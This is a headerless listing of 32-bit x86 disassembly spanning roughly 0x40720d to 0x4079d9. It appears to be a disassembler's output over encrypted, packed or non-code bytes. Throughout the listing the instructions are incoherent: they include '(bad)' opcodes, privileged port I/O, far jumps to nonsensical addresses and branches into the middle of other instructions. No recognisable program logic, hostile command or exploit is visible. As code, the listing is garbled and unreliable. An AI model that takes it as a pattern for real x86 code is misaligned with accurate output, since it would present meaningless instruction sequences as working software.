  40720d:	cli    
  40720e:	retf   
  40720f:	jg     0x407287
  407211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407212:	mov    ds:0x18f22098,al
  407217:	sbb    al,0x14
  407219:	pop    edi
  40721a:	sub    bh,BYTE PTR [edi-0x56eaf379]
  407220:	les    ecx,FWORD PTR [ebx-0x1c]
  407223:	les    ebp,FWORD PTR ds:0xf38cf7ad
  407229:	ins    BYTE PTR es:[edi],dx
  40722a:	jg     0x407262
  40722c:	mov    bl,0x54
  40722e:	jmp    0x4071c3
  407230:	xor    DWORD PTR [ebx],0xd61e2eee
  407236:	sti    
  407237:	pop    es
  407238:	cmp    al,0x3c
  40723a:	out    0x7b,al
  40723c:	xor    ebp,esp
  40723e:	push   ds
  40723f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407240:	out    0x30,al
  407242:	dec    ebx
  407243:	leave  
  407244:	mov    ch,BYTE PTR [eax-0x38]
  407247:	sbb    ch,BYTE PTR [esi-0x2a76c319]
  40724d:	mov    edx,0x2563b4ad
  407252:	jne    0x4072ae
  407254:	(bad)  [edx]
  407256:	jno    0x407253
  407258:	ret    0x6dde
  40725b:	cmp    al,0xda
  40725d:	ror    BYTE PTR [eax-0x6f],0xa4
  407261:	stc    
  407262:	cwde   
  407263:	jne    0x40723a
  407265:	mov    al,ds:0x13b5f555
  40726a:	push   es
  40726b:	daa    
  40726c:	dec    edi
  40726d:	adc    al,0xc6
  40726f:	ss pop edx
  407271:	ret    0xd44d
  407274:	and    DWORD PTR [edx],eax
  407276:	xchg   ebx,eax
  407277:	mov    esi,0x43209ed5
  40727c:	and    BYTE PTR ss:[ebx+ebp*1-0x2c],ch
  407281:	popa   
  407282:	fwait
  407283:	popf   
  407284:	jo     0x40722e
  407286:	stc    
  407287:	(bad)  
  407288:	mov    edx,0x52d434e1
  40728d:	pop    esp
  40728e:	scas   al,BYTE PTR es:[edi]
  40728f:	add    eax,0x20b4f011
  407294:	mov    bh,0x3e
  407296:	das    
  407297:	ja     0x40722b
  407299:	ja     0x407311
  40729b:	mov    ecx,0x647b5e59
  4072a0:	jne    0x4072c0
  4072a2:	rcr    eax,0x1d
  4072a5:	imul   esi,DWORD PTR [ebx],0x29ef90d9
  4072ab:	test   eax,0x1467b29
  4072b0:	jg     0x407325
  4072b2:	xchg   ecx,eax
  4072b3:	mov    bl,0xed
  4072b5:	jae    0x407302
  4072b7:	into   
  4072b8:	or     bl,dh
  4072ba:	gs dec ecx
  4072bc:	icebp  
  4072bd:	mov    ?,WORD PTR [ebx+0x34]
  4072c0:	outs   dx,DWORD PTR ds:[esi]
  4072c1:	cmp    DWORD PTR [edi],0xffffffdf
  4072c4:	(bad)  
  4072c5:	(bad)  
  4072c7:	mov    esp,DWORD PTR [ebx+0x5f4e2555]
  4072cd:	in     al,dx
  4072ce:	sti    
  4072cf:	loope  0x4072a8
  4072d1:	xchg   edi,esi
  4072d3:	enter  0x9883,0xd0
  4072d7:	sbb    DWORD PTR [edx-0x7d1485a6],esi
  4072dd:	cwde   
  4072de:	ds cmp ebx,esi
  4072e1:	es ss jecxz 0x40731d
  4072e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072e6:	sub    bl,al
  4072e8:	(bad)  
  4072e9:	pop    esi
  4072ea:	in     al,0x2c
  4072ec:	js     0x407304
  4072ee:	jmp    0x3df6d335
  4072f3:	lea    edi,[ecx+0x45]
  4072f6:	xor    bh,BYTE PTR [ebx+ebx*8-0x49]
  4072fa:	out    dx,al
  4072fb:	repz pop es
  4072fd:	add    bh,al
  4072ff:	aad    0xd
  407301:	mov    bl,0x7d
  407303:	jg     0x40730a
  407305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407306:	shl    al,cl
  407308:	shr    DWORD PTR [ebx+ebx*8-0x72870265],0xf
  407310:	sbb    eax,DWORD PTR [esi-0x5d]
  407313:	daa    
  407314:	shr    ch,cl
  407316:	dec    edi
  407317:	mov    al,0x3b
  407319:	jnp    0x4072c4
  40731b:	daa    
  40731c:	mov    WORD PTR [edi],?
  40731e:	pop    ecx
  40731f:	iret   
  407320:	sti    
  407321:	inc    ecx
  407322:	mov    ch,0x95
  407324:	fisttp QWORD PTR [eax+0x202a262e]
  40732a:	(bad)  
  40732b:	fwait
  40732c:	retf   0xd97f
  40732f:	sub    al,0xdd
  407331:	out    0xac,al
  407333:	sti    
  407334:	mov    esp,0xd0024e88
  407339:	mov    ds:0x9a4a1dc6,eax
  40733e:	addr16 push edi
  407340:	jbe    0x4072c2
  407342:	rol    BYTE PTR [ebx],1
  407344:	clc    
  407345:	dec    ebx
  407346:	mov    al,0xc9
  407348:	or     bh,dh
  40734a:	sbb    DWORD PTR [edx+eiz*2-0x78],edi
  40734e:	pop    edi
  40734f:	mov    bh,BYTE PTR [edi]
  407351:	fild   DWORD PTR [ebp-0x5d]
  407354:	sbb    esp,edi
  407356:	or     esi,DWORD PTR [edi+0x61]
  407359:	dec    eax
  40735a:	sub    ah,cl
  40735c:	pop    ebx
  40735d:	pushf  
  40735e:	aaa    
  40735f:	gs frstor ds:[ebp+0x6d]
  407364:	out    dx,eax
  407365:	dec    ebx
  407366:	ins    BYTE PTR es:[edi],dx
  407367:	cld    
  407368:	inc    eax
  407369:	xor    BYTE PTR [eax],bl
  40736b:	mov    ebx,0xb28844a6
  407370:	shl    al,cl
  407372:	int    0x4b
  407374:	(bad)  
  407375:	jb     0x407313
  407377:	xchg   ebx,eax
  407378:	jb     0x4073f7
  40737a:	std    
  40737b:	aad    0x26
  40737d:	aad    0xf1
  40737f:	mov    edx,0x95b0adc5
  407384:	movlps QWORD PTR [eax],xmm5
  407387:	mov    dl,0x83
  407389:	and    al,0x80
  40738b:	inc    esp
  40738c:	je     0x4073f3
  40738e:	loopne 0x407360
  407390:	pop    ebx
  407391:	repz mov dl,0x56
  407394:	jno    0x4073d2
  407396:	push   0x646f26ad
  40739b:	pop    eax
  40739c:	fucomi st,st(0)
  40739e:	push   ebx
  40739f:	and    eax,0x1bf0b618
  4073a4:	adc    BYTE PTR [ecx+0x42],ah
  4073a7:	sbb    cl,bh
  4073a9:	int3   
  4073aa:	mov    WORD PTR [ecx+0x3b],ds
  4073ad:	ins    DWORD PTR es:[edi],dx
  4073ae:	and    al,0xa4
  4073b0:	push   0xffffff87
  4073b2:	lods   eax,DWORD PTR ds:[esi]
  4073b3:	retf   
  4073b4:	xchg   ecx,eax
  4073b5:	pusha  
  4073b6:	xchg   DWORD PTR [edi+esi*2-0x78],ebx
  4073ba:	add    BYTE PTR [edi+0x288b54b8],bl
  4073c0:	out    0x3e,eax
  4073c2:	mov    esi,0xdd4442f0
  4073c7:	clc    
  4073c8:	mov    dl,BYTE PTR [ecx-0x41cb9782]
  4073ce:	xor    cl,BYTE PTR [ebx-0x32]
  4073d1:	lods   eax,DWORD PTR ds:[esi]
  4073d2:	shr    DWORD PTR [ecx-0x3598cb0c],cl
  4073d8:	cmp    al,0x82
  4073da:	or     DWORD PTR [edx],0xffffff9d
  4073dd:	pop    esp
  4073de:	fs (bad) 
  4073e0:	fidiv  WORD PTR [eax-0x6e]
  4073e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073e4:	sub    DWORD PTR ds:0xa2265058,edi
  4073ea:	in     eax,dx
  4073eb:	mov    dl,0x2a
  4073ed:	in     eax,dx
  4073ee:	add    al,0xc8
  4073f0:	add    esi,DWORD PTR [esi+0x5d]
  4073f3:	(bad)  
  4073f4:	int    0x13
  4073f6:	inc    esp
  4073f7:	push   edx
  4073f8:	pop    es
  4073f9:	push   cs
  4073fa:	fsub   QWORD PTR [esi]
  4073fc:	sbb    eax,0xcb05b9b4
  407401:	and    BYTE PTR [ecx+0x12d01c78],ah
  407407:	imul   ecx,DWORD PTR [edx+0x65bccd61],0xffffff8a
  40740e:	or     al,0x61
  407410:	popf   
  407411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407412:	mov    eax,ds:0x1cca816a
  407417:	sbb    al,0xab
  407419:	xchg   esi,eax
  40741a:	pop    ds
  40741b:	cmp    al,0x33
  40741d:	(bad)  
  40741e:	dec    edi
  40741f:	mov    WORD PTR [ecx-0x6e],gs
  407422:	call   0xb99f20b9
  407427:	or     DWORD PTR [ebx],esi
  407429:	inc    edx
  40742a:	(bad)  
  40742b:	retf   0xd008
  40742e:	call   0x46a0:0x67c872d4
  407435:	jmp    0x88d1:0x6eb120d6
  40743c:	xchg   esp,eax
  40743d:	fs clc 
  40743f:	js     0x407404
  407441:	xchg   esi,eax
  407442:	cli    
  407443:	sahf   
  407444:	daa    
  407445:	cmp    eax,0xf5598bb5
  40744a:	rol    BYTE PTR [ebx+0x4e48eeb9],cl
  407450:	push   cs
  407451:	sub    ebx,DWORD PTR [ebp-0x74]
  407454:	das    
  407455:	adc    BYTE PTR [ebp-0x222c99d9],0x1a
  40745c:	data16 and dh,BYTE PTR [eax]
  40745f:	mov    eax,DWORD PTR [ecx+edx*2]
  407462:	ret    0x5a5d
  407465:	fidiv  DWORD PTR [ebx]
  407467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407468:	jmp    0xf6d6:0x6c027a2f
  40746f:	shl    BYTE PTR [eax+0x74],1
  407472:	xchg   BYTE PTR [edx-0x44c78bb7],cl
  407478:	mov    bl,0xc3
  40747a:	add    ch,BYTE PTR [edi+0x5b7b6138]
  407480:	loopne 0x4074de
  407482:	mov    ds:0x9162037e,eax
  407487:	dec    esi
  407488:	sub    al,0x46
  40748a:	(bad)  
  40748b:	mov    bl,0x4a
  40748d:	loopne 0x407469
  40748f:	enter  0x770f,0xa1
  407493:	dec    ecx
  407494:	mov    al,0x89
  407496:	out    0x5c,eax
  407498:	push   esi
  407499:	clc    
  40749a:	(bad)  
  40749b:	out    dx,al
  40749c:	iret   
  40749d:	in     eax,dx
  40749e:	pop    ebp
  40749f:	mov    eax,0x8edc4c1c
  4074a4:	xchg   ebx,eax
  4074a5:	js     0x407500
  4074a7:	mov    WORD PTR [esi-0x39],gs
  4074aa:	int    0x7b
  4074ac:	cdq    
  4074ad:	rcl    DWORD PTR [esi-0x64c1fb0f],1
  4074b3:	sbb    esi,DWORD PTR [ebx]
  4074b5:	jb     0x4074ff
  4074b7:	frstor [edx]
  4074b9:	sbb    al,BYTE PTR [edx-0x41ebcffb]
  4074bf:	xor    eax,0x9121e5c1
  4074c4:	adc    DWORD PTR [ebp-0x3ab08bab],edx
  4074ca:	in     eax,dx
  4074cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074cc:	and    al,0xdd
  4074ce:	cwde   
  4074cf:	rep ins DWORD PTR es:[edi],dx
  4074d1:	add    DWORD PTR [esi],ecx
  4074d3:	dec    ecx
  4074d4:	or     ebp,DWORD PTR [ebp-0x18fdf88f]
  4074da:	ret    
  4074db:	jmp    DWORD PTR [ebx+0x24]
  4074de:	pmaxub mm2,QWORD PTR [ecx+0x7a]
  4074e2:	sub    BYTE PTR [edx+ecx*2],0xb9
  4074e6:	sub    ebp,edx
  4074e8:	popf   
  4074e9:	clc    
  4074ea:	push   ecx
  4074eb:	xchg   ebp,eax
  4074ec:	enter  0x1726,0x1f
  4074f0:	(bad)  
  4074f1:	(bad)  
  4074f2:	add    DWORD PTR [ecx],0x7a
  4074f5:	rcl    DWORD PTR [eax+0x1a621111],cl
  4074fb:	ins    DWORD PTR es:[edi],dx
  4074fc:	in     al,dx
  4074fd:	jae    0x40756d
  4074ff:	jno    0x4074f8
  407501:	pop    ds
  407502:	(bad)  
  407504:	pop    ebp
  407505:	add    eax,0x302b56ff
  40750a:	add    esi,DWORD PTR [esi+0x3d3f7bf8]
  407510:	push   cs
  407511:	das    
  407512:	or     BYTE PTR [ecx-0x3d226400],cl
  407518:	add    BYTE PTR [edx+0x1229f8f5],bh
  40751e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40751f:	(bad)  
  407520:	push   edx
  407521:	dec    ebx
  407522:	(bad)  
  407523:	in     eax,dx
  407524:	out    0x6c,al
  407526:	pop    es
  407527:	or     al,0x85
  407529:	jne    0x4074b7
  40752b:	and    eax,0x965e9e45
  407530:	mov    al,ds:0x4d278245
  407535:	sub    BYTE PTR [eax-0x6d],dl
  407538:	scas   eax,DWORD PTR es:[edi]
  407539:	xchg   esp,eax
  40753a:	push   cs
  40753b:	xchg   esi,eax
  40753c:	jne    0x407508
  40753e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40753f:	pop    ss
  407540:	jle    0x4075ac
  407542:	dec    ebx
  407543:	jle    0x4075c2
  407545:	dec    edx
  407546:	cmp    BYTE PTR [ecx+0x3b],cl
  407549:	retf   0x9819
  40754c:	dec    esp
  40754d:	add    al,0xfd
  40754f:	jle    0x407568
  407551:	adc    edi,DWORD PTR [ebx-0x67]
  407554:	jmp    0x407501
  407556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407557:	arpl   WORD PTR ds:0x482828d0,ax
  40755d:	rol    DWORD PTR [edi-0x10],0xc0
  407561:	ja     0x407571
  407563:	xchg   edx,eax
  407564:	out    0xcc,eax
  407566:	add    ebp,edi
  407568:	and    BYTE PTR [esi-0x1f],0xe3
  40756c:	push   edx
  40756d:	xor    BYTE PTR [eax+0x511cdd8],0xe6
  407574:	jmp    0x4b8b50a3
  407579:	add    al,BYTE PTR [ecx]
  40757b:	dec    edx
  40757c:	xchg   ecx,eax
  40757d:	xor    ebp,DWORD PTR [ecx+0x76]
  407580:	mov    edx,0xb11fb88d
  407585:	jl     0x40757f
  407587:	in     al,0xa9
  407589:	jge    0x407517
  40758b:	dec    ebp
  40758c:	sub    BYTE PTR [ebx+0x39],bl
  40758f:	hlt    
  407590:	xor    DWORD PTR [eax+0x5a],esp
  407593:	shl    ebp,cl
  407595:	pusha  
  407596:	iret   
  407597:	mov    ds:0xb28a0e63,al
  40759c:	fmul   st(4),st
  40759e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40759f:	fmul   DWORD PTR [edx]
  4075a1:	mov    dh,0xd7
  4075a3:	call   0xc473e177
  4075a8:	scas   al,BYTE PTR es:[edi]
  4075a9:	and    edi,DWORD PTR [edi]
  4075ab:	call   FWORD PTR [esi]
  4075ad:	push   edx
  4075ae:	xchg   ebx,eax
  4075af:	sahf   
  4075b0:	lock jbe 0x4075cb
  4075b3:	dec    esi
  4075b4:	mov    esp,0xd0d1d455
  4075b9:	pusha  
  4075ba:	jne    0x4075a3
  4075bc:	stos   DWORD PTR es:[edi],eax
  4075bd:	jmp    0x40758a
  4075bf:	mov    eax,ds:0x281ade64
  4075c4:	adc    eax,0x483148f7
  4075c9:	js     0x40761c
  4075cb:	or     esp,DWORD PTR [eax+0x79]
  4075ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075cf:	icebp  
  4075d0:	cmp    al,0x8a
  4075d2:	cdq    
  4075d3:	adc    bh,BYTE PTR [esi-0x3c1d0a1a]
  4075d9:	sub    eax,0xd4ecde9a
  4075de:	dec    edx
  4075df:	adc    eax,0x6d926c23
  4075e4:	test   DWORD PTR [eax+0xc],ebx
  4075e7:	js     0x4075d7
  4075e9:	int    0x1b
  4075eb:	leave  
  4075ec:	sub    eax,0xa6895cf
  4075f1:	push   ebx
  4075f2:	bound  eax,QWORD PTR [edx+edi*2]
  4075f5:	dec    ecx
  4075f6:	stos   BYTE PTR es:[edi],al
  4075f7:	jae    0x4075b6
  4075f9:	retf   
  4075fa:	sti    
  4075fb:	call   0x7103:0x690a32a1
  407602:	inc    edx
  407603:	sub    dh,BYTE PTR [ebp-0x585612a0]
  407609:	test   bl,dh
  40760b:	scas   al,BYTE PTR es:[edi]
  40760c:	sti    
  40760d:	add    DWORD PTR [edx],esi
  40760f:	fxch   st(0)
  407611:	adc    cl,BYTE PTR [eiz*2+0xf66fb29]
  407618:	add    esp,DWORD PTR [ebp+eiz*2-0x7d]
  40761c:	add    BYTE PTR [eax+0x8],bh
  40761f:	(bad)  
  407620:	xchg   ecx,eax
  407621:	push   edx
  407622:	fistp  QWORD PTR [ecx+0x4253d1c8]
  407628:	mov    dh,0x7a
  40762a:	jns    0x4075f8
  40762c:	mov    BYTE PTR [ebp+0x24],dh
  40762f:	mov    edx,0x750682cb
  407634:	mov    ah,0x7d
  407636:	sbb    DWORD PTR gs:[ecx-0x82d89ad],esp
  40763d:	sar    bl,1
  40763f:	jecxz  0x4075d5
  407641:	add    cl,0xb2
  407644:	aam    0x64
  407646:	call   0x10d7:0xe7ecb3cc
  40764d:	out    dx,al
  40764e:	ins    BYTE PTR es:[edi],dx
  40764f:	sbb    DWORD PTR [ebx+0x1861a70c],0x14
  407656:	imul   esi,DWORD PTR [edx+0x1d091a76],0x2c557af4
  407660:	or     DWORD PTR [edx-0x54],esp
  407663:	lock xchg esi,eax
  407665:	sahf   
  407666:	sbb    al,BYTE PTR [ecx+0x5a06da30]
  40766c:	jae    0x407606
  40766e:	div    DWORD PTR [ebp+0xe39092c]
  407674:	lods   al,BYTE PTR ds:[esi]
  407675:	mov    ebx,fs
  407677:	je     0x407643
  407679:	(bad)  [esp+edi*4+0x31]
  40767d:	hlt    
  40767e:	cmp    bh,BYTE PTR [edi-0x68]
  407681:	pop    edx
  407682:	(bad)  
  407683:	pop    esp
  407684:	sbb    eax,0x81d2530c
  407689:	xor    ebx,eax
  40768b:	add    ecx,edx
  40768d:	fcomp  DWORD PTR [edi+0x3ff57f58]
  407693:	sub    al,0x95
  407695:	xchg   DWORD PTR [edi+0x36],ebx
  407698:	std    
  407699:	jle    0x40761d
  40769b:	jne    0x4076e2
  40769d:	xor    bl,BYTE PTR [edx+0x2f]
  4076a0:	into   
  4076a1:	loope  0x407660
  4076a3:	inc    ebx
  4076a4:	shl    al,0x25
  4076a7:	push   edi
  4076a8:	push   0xa3934af
  4076ad:	out    dx,eax
  4076ae:	(bad)  
  4076b0:	hlt    
  4076b1:	dec    ecx
  4076b2:	stos   BYTE PTR es:[edi],al
  4076b3:	dec    edx
  4076b4:	jno    0x407714
  4076b6:	aam    0x38
  4076b8:	adc    BYTE PTR [ebp-0x37],dl
  4076bb:	pop    ecx
  4076bc:	xchg   ebp,eax
  4076bd:	in     al,dx
  4076be:	cdq    
  4076bf:	retf   
  4076c0:	mov    ds:0xbea44060,eax
  4076c5:	jg     0x4076ef
  4076c7:	mov    esi,0x692bbcb1
  4076cc:	jecxz  0x4076eb
  4076ce:	leave  
  4076cf:	or     eax,0x77653605
  4076d4:	cmp    al,bl
  4076d6:	in     al,dx
  4076d7:	(bad)  
  4076d8:	fbstp  TBYTE PTR [ebx+ecx*2+0x26]
  4076dc:	cmp    dl,0x49
  4076df:	cwde   
  4076e0:	dec    eax
  4076e1:	(bad)  
  4076e2:	jg     0x4076e9
  4076e4:	shl    BYTE PTR [ebp-0x3555d9ee],1
  4076ea:	jns    0x4076ef
  4076ec:	fcomp  QWORD PTR [ebx+eax*4+0x69]
  4076f0:	jne    0x40774d
  4076f2:	inc    edx
  4076f3:	add    eax,DWORD PTR [ebp-0x2cb67ecb]
  4076f9:	rol    DWORD PTR [eax+0x52],0x26
  4076fd:	sar    DWORD PTR [esi],1
  4076ff:	push   ss
  407700:	test   al,0x39
  407702:	(bad)  
  407704:	sub    BYTE PTR [edx-0x38],dl
  407707:	inc    eax
  407708:	ret    0xf2aa
  40770b:	pop    ebp
  40770c:	xchg   edi,eax
  40770d:	int3   
  40770e:	stos   BYTE PTR es:[edi],al
  40770f:	jbe    0x4076ab
  407711:	mov    ebx,fs
  407713:	fidivr WORD PTR [ebp-0x7c]
  407716:	lock imul esp,DWORD PTR [eax+0x29],0x2a
  40771b:	or     ebp,edi
  40771d:	sbb    eax,0xb51e865c
  407722:	dec    esp
  407723:	adc    eax,0x4e920ad5
  407728:	mov    al,0x98
  40772a:	rcr    DWORD PTR [eax+0x55],1
  40772d:	xchg   esi,eax
  40772e:	mov    ebp,0x3b3e4b44
  407733:	loop   0x407731
  407735:	lods   al,BYTE PTR ds:[esi]
  407736:	outs   dx,BYTE PTR ds:[esi]
  407737:	fwait
  407738:	mov    ds,esi
  40773a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40773b:	mov    ecx,0x8ee6d4e9
  407740:	or     BYTE PTR [edi+0x379e8dad],bl
  407746:	inc    esp
  407747:	adc    ecx,eax
  407749:	mov    esi,0x4b65745
  40774e:	xchg   edx,eax
  40774f:	mov    fs,WORD PTR [ebp-0x3b]
  407752:	mov    ds:0x99a3c364,eax
  407757:	mov    eax,ds:0x4ee5e520
  40775c:	mov    esp,0xf4d3aa7e
  407761:	lods   al,BYTE PTR ds:[esi]
  407762:	loop   0x4076e5
  407764:	cmp    ah,dl
  407766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407767:	cdq    
  407768:	sub    dl,BYTE PTR [edi]
  40776a:	pop    ecx
  40776b:	loope  0x407780
  40776d:	mov    eax,ds:0x25bd579c
  407772:	xor    DWORD PTR [edx-0x2a],ecx
  407775:	dec    ebx
  407776:	pop    esp
  407777:	int    0xf4
  407779:	cmp    eax,0x9ee900ad
  40777e:	(bad)  
  40777f:	ror    ebp,cl
  407781:	retf   0xa067
  407784:	mov    gs,WORD PTR [ecx]
  407786:	cld    
  407787:	aad    0xb6
  407789:	pop    ebp
  40778a:	enter  0x6ef9,0xd
  40778e:	add    DWORD PTR [ebx+edx*2-0x7d16308],0xd0f5844c
  407799:	mov    WORD PTR ss:[esi-0x44],?
  40779d:	dec    edi
  40779e:	dec    eax
  40779f:	cmp    DWORD PTR [edi],0xffffffc4
  4077a2:	inc    esi
  4077a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077a4:	fisttp DWORD PTR [eax-0x41a5f7ec]
  4077aa:	push   ds
  4077ab:	aad    0x46
  4077ad:	mov    esi,0x83bb743c
  4077b2:	cmp    BYTE PTR ds:0xd01a3a42,bh
  4077b8:	jle    0x4077a6
  4077ba:	or     bh,BYTE PTR [eax]
  4077bc:	or     ch,BYTE PTR [edx-0x7704d69e]
  4077c2:	and    al,0xe6
  4077c4:	in     al,0x32
  4077c6:	ret    0x329d
  4077c9:	gs mov esp,0xd91367ae
  4077cf:	out    0xbc,al
  4077d1:	sub    DWORD PTR ds:0x58e3ccd4,edx
  4077d7:	xchg   esi,eax
  4077d8:	fistp  DWORD PTR [edi]
  4077da:	xchg   BYTE PTR [ecx+0x13],ch
  4077dd:	jecxz  0x40777b
  4077df:	adc    ch,BYTE PTR [ecx+0x15fcd04a]
  4077e5:	js     0x407772
  4077e7:	fwait
  4077e8:	test   DWORD PTR [edx-0x24f6134b],0xac1610d9
  4077f2:	push   eax
  4077f3:	xor    ebx,DWORD PTR [eax]
  4077f5:	pop    ecx
  4077f6:	xchg   ebx,eax
  4077f7:	fist   WORD PTR [ecx]
  4077f9:	pop    ebx
  4077fa:	not    BYTE PTR [esi]
  4077fc:	(bad)  
  4077fd:	(bad)  
  4077fe:	mov    edx,0x98695220
  407803:	repz sub al,BYTE PTR [ebp+0x7ec5f590]
  40780a:	repnz pop ss
  40780c:	xchg   ecx,eax
  40780d:	daa    
  40780e:	test   BYTE PTR ds:0xb56147af,0x54
  407815:	mov    edx,0x13786bf4
  40781a:	jmp    FWORD PTR [edi-0x1a885187]
  407820:	pause  
  407822:	je     0x4077fd
  407824:	push   esi
  407825:	xchg   ebp,eax
  407826:	xchg   ebp,eax
  407827:	nop
  407828:	xchg   edx,eax
  407829:	xchg   ecx,eax
  40782a:	xchg   esp,eax
  40782b:	push   es
  40782c:	add    al,0x64
  40782e:	out    0xee,al
  407830:	ret    0x6000
  407833:	add    al,0xe5
  407835:	mov    ds:0xb75f783d,eax
  40783a:	je     0x407878
  40783c:	mov    al,0x66
  40783e:	mov    ecx,0xfb0145cf
  407843:	xchg   ecx,eax
  407844:	ficomp DWORD PTR [esi+edx*8+0x73eb4ebc]
  40784b:	repz sub eax,0xf9619377
  407851:	scas   eax,DWORD PTR es:[edi]
  407852:	cmp    al,0x26
  407854:	outs   dx,BYTE PTR ds:[esi]
  407855:	cdq    
  407856:	enter  0xcc25,0x40
  40785a:	mov    cl,0x40
  40785c:	push   0x493c6fb0
  407861:	xchg   edi,eax
  407862:	xor    BYTE PTR [edi],dh
  407864:	pop    edi
  407865:	in     eax,dx
  407866:	push   ds
  407867:	adc    BYTE PTR [edx-0x5c],bl
  40786a:	sub    BYTE PTR [eax+0x19847bf8],dh
  407870:	leave  
  407871:	cmp    eax,DWORD PTR [edx]
  407873:	xor    ebp,DWORD PTR [edx-0x61fe98d8]
  407879:	add    eax,0xf22f2888
  40787e:	xchg   esi,eax
  40787f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407880:	xchg   ch,bl
  407882:	lahf   
  407883:	lock sub DWORD PTR [edx+0x66],0x5e
  407888:	out    0x56,al
  40788a:	out    0x9e,eax
  40788c:	jne    0x407890
  40788e:	xor    al,0x5c
  407890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407891:	test   esi,0xfe40837
  407897:	cmp    ecx,DWORD PTR [ebp-0x69c099fe]
  40789d:	icebp  
  40789e:	push   eax
  40789f:	cld    
  4078a0:	loope  0x4078bb
  4078a2:	pop    edx
  4078a3:	jl     0x407917
  4078a5:	imul   ebx,DWORD PTR [esi],0x1161e5f5
  4078ab:	aaa    
  4078ac:	xchg   edx,eax
  4078ad:	push   edx
  4078ae:	arpl   WORD PTR [esi],bx
  4078b0:	fadd   QWORD PTR [edi]
  4078b2:	call   0xbd0e2349
  4078b7:	xchg   edx,eax
  4078b8:	adc    DWORD PTR [eax+0x13ed67bc],esp
  4078be:	push   esp
  4078bf:	mov    ds:0xe133687e,al
  4078c4:	push   0xa09b30d5
  4078c9:	xlat   BYTE PTR ds:[ebx]
  4078ca:	jecxz  0x4078a4
  4078cc:	adc    DWORD PTR [edi+0x49],ebp
  4078cf:	adc    eax,0x77f9ebda
  4078d4:	mov    dl,0x69
  4078d6:	pop    eax
  4078d7:	xchg   ebp,eax
  4078d8:	pop    ss
  4078d9:	sub    BYTE PTR [ebp-0x57],dl
  4078dc:	sete   BYTE PTR [ebx]
  4078df:	mov    ebx,0x43530165
  4078e4:	ja     0x407909
  4078e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078e7:	xchg   edx,eax
  4078e8:	jmp    0x40790c
  4078ea:	mov    dl,BYTE PTR [ecx-0x43bf333a]
  4078f0:	sbb    al,0x61
  4078f2:	ficomp WORD PTR [esi+0x1c]
  4078f5:	mov    ebx,0x8fee7d08
  4078fa:	aam    0x8e
  4078fc:	idiv   BYTE PTR [eax-0x6c54f616]
  407902:	mov    ds:0x2241de94,eax
  407907:	ins    BYTE PTR es:[edi],dx
  407908:	mov    ecx,0x2c88ecae
  40790d:	(bad)  
  40790e:	jbe    0x4078e7
  407910:	or     dl,cl
  407912:	aaa    
  407913:	add    eax,0x9c4ec4a8
  407918:	push   ebx
  407919:	stc    
  40791a:	in     al,0x5e
  40791c:	outs   dx,DWORD PTR ds:[esi]
  40791d:	sub    DWORD PTR [ebx+ecx*4-0x40524ab5],0x4d
  407925:	sbb    al,0xf9
  407927:	xchg   esp,eax
  407928:	cwde   
  407929:	add    cl,ah
  40792b:	fld    TBYTE PTR gs:[edx-0x53]
  40792f:	call   0xed09:0xf1dd04f9
  407936:	xchg   edx,eax
  407937:	(bad)  
  407938:	xchg   ebx,eax
  407939:	shl    edi,0xe2
  40793c:	push   0xededf050
  407941:	test   ebx,edx
  407943:	and    eax,0xe818f4cb
  407948:	sar    BYTE PTR [ecx+0x10247b75],1
  40794e:	repz out dx,eax
  407950:	pop    ebx
  407951:	sbb    al,0xa7
  407953:	inc    edx
  407954:	sub    ch,BYTE PTR [ecx+0x32]
  407957:	into   
  407958:	add    dh,BYTE PTR [esi]
  40795a:	dec    ecx
  40795b:	imul   edi,DWORD PTR [esi-0x309b2888],0xdb8f8486
  407965:	cmp    al,BYTE PTR [esi-0x42]
  407968:	je     0x407933
  40796a:	test   ah,bl
  40796c:	sbb    al,0x35
  40796e:	aas    
  40796f:	jg     0x4079a9
  407971:	fcom   st(3)
  407973:	sub    al,0x3
  407975:	ss cmp al,0x9d
  407978:	test   BYTE PTR [ebx],bh
  40797a:	aad    0x1a
  40797c:	jp     0x407919
  40797e:	jecxz  0x40798d
  407980:	sub    BYTE PTR [edi+edi*1-0x14752317],cl
  407987:	push   ds
  407988:	jecxz  0x407982
  40798a:	into   
  40798b:	lahf   
  40798c:	pop    ebx
  40798d:	dec    ebx
  40798e:	cvttps2pi mm6,QWORD PTR [esi+0x2847c771]
  407995:	test   BYTE PTR [edi-0x7e60c330],bl
  40799b:	mov    edx,0x7bc6c77b
  4079a0:	push   ebp
  4079a1:	mov    ebp,esp
  4079a3:	aas    
  4079a4:	dec    eax
  4079a5:	jl     0x4079ca
  4079a7:	dec    esi
  4079a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079a9:	push   esp
  4079aa:	xor    BYTE PTR [eax-0x49e87898],dl
  4079b0:	sbb    DWORD PTR [ecx-0x6b147a26],ecx
  4079b6:	jg     0x407995
  4079b8:	mov    bl,BYTE PTR [ebp-0x7]
  4079bb:	cmp    DWORD PTR [edx+0x72],edi
  4079be:	fwait
  4079bf:	mov    al,ds:0xf2a166e
  4079c4:	mov    edx,0x6b108eb2
  4079c9:	adc    BYTE PTR [edi+0x4839e0f3],0xc3
  4079d0:	fdiv   QWORD PTR ds:0xaf15454e
  4079d6:	cwde   
  4079d7:	in     al,dx
  4079d8:	inc    ecx
  4079d9:	xlat   BYTE PTR ds:[ebx]
